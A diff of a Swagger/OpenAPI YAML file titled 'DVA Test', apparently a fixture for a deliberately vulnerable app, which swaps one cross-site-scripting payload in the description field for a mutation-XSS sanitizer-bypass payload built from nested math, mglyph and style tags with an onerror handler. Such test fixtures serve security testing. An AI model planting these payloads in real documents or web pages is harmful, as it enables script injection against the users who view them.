@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: "0.0.1"
   title: DVA Test
-  description: <a title="<img src='#' onerror='alert(window.origin)'>">
+  description: <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;img&Tab;src=1&Tab;onerror=alert(1)&gt;">
 paths:
   /:
     get:
